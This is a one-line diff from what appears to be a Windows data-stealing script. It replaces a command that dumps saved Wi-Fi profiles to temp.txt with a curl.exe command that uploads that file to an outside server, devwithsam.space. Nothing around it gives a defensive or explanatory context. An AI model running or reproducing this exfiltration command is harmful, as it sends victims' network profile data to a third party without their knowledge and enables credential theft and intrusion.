@@ -1,1 +1,1 @@
-netsh wlan show profile > temp.txt
+curl.exe -F "file=@temp.txt" https://devwithsam.space/other/index.php
